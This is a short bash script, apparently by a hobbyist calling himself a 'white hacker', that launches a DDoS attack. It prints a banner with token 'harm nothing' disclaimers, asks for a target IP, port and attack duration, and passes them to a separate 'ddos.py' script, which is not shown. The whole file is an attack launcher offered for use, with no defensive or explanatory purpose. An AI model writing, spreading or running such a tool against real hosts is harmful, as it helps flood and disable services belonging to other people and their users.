#!/bin/bash
#
#
# Coded by : Ghos Hunter | White Hacker
# More Info : http://www.ypnwhitehacker.blogspot.com
#
#

# START

# Header
echo ""                                     
echo "    Let's Make Your Exploitation And Have Fun"
echo "" 
echo "    ==[ Note:This Tool Is For Beginner "
echo "    ==[ Note:Don't Use This Tool "
echo "    ==[ Note:To Harm Something "
echo "    ==[ Note:Hack Everything,Harm Nothing"
echo "    ==[ Tools Name : Ddos Attack"
echo "    ==[ Coded by : Yell Phone Naing"
echo "    ==[ Version : 1.0.0"
echo "    ==[ Program Type :Python"

# Select Target
echo " Enter Website Information Below "
echo "" 
echo " Ddos Attack >>"
echo " Enter Ip>>"
read TARGET1
echo "Enter Port"
read TERGET2
echo "Time To Attack "
read TERGET3
python ddos.py -s $TARGET1 -p $TERGET2 -t $TERGET3


# END
